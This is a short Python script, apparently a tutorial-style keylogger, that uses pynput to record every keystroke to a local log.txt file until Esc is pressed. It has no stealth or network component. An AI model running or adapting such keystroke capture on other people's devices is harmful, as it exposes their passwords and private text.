import os
from pynput import keyboard

MAX_CHAR_IN_LINE = 80
lineLength = 0

def keyPress(key):
    global lineLength; lineLength += 1

    if key == keyboard.Key.backspace:
        with open("log.txt", 'rb+') as file:
            file.seek(-1, os.SEEK_END)
            file.truncate()
    elif key == keyboard.Key.enter or key == keyboard.Key.tab:
        writeToFile("\n")
        lineLength = 0
    elif key == keyboard.Key.space:
        writeToFile(" ")
    elif str(key).find("Key") == -1:
        if lineLength > MAX_CHAR_IN_LINE:
            writeToFile("\n")
        writeToFile(str(key)[1:-1])

def keyRelease(key):
    if key == keyboard.Key.esc:
        return False
    
def writeToFile(string):
    with open("log.txt", "a") as file:
        file.write(string)

with keyboard.Listener(on_press=keyPress, on_release=keyRelease) as keyListener:
    keyListener.join()